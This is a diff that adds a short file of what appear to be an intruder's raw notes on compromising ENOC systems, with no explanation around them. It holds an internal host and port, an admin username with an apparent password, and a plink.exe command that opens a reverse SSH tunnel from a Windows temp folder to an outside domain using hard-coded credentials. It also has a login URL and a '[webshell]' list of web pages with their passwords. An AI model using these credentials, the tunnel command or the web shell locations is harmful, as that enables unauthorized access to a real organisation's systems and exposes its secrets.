@@ -1,0 +1,14 @@
+enocdmzsp1:5858
+mossdmzadmin
+system99$
+
+c:\windows\temp\plink.exe mydomain1607.com -C -R 0.0.0.0:5858:enocdmzsp1:5858 -l aaa -pw 1234qweR < c:\windows\temp\y.txt  
+https://vetting.enoc.com/_LAYOUTS/LdapContosoVettingAuthentication/LoginCustomCntrlPage.aspx?ReturnUrl=%2f_layouts%2fAuthenticate.aspx%3fSource%3d%252F&Source=%2F
+
+
+
+[webshell]
+https://marcom.enoc.com/_layouts/mssharepoint.aspx
+pass:enocpass
+http://eti.enoc.ae/ETI/calendar.aspx
+pass:enocpass
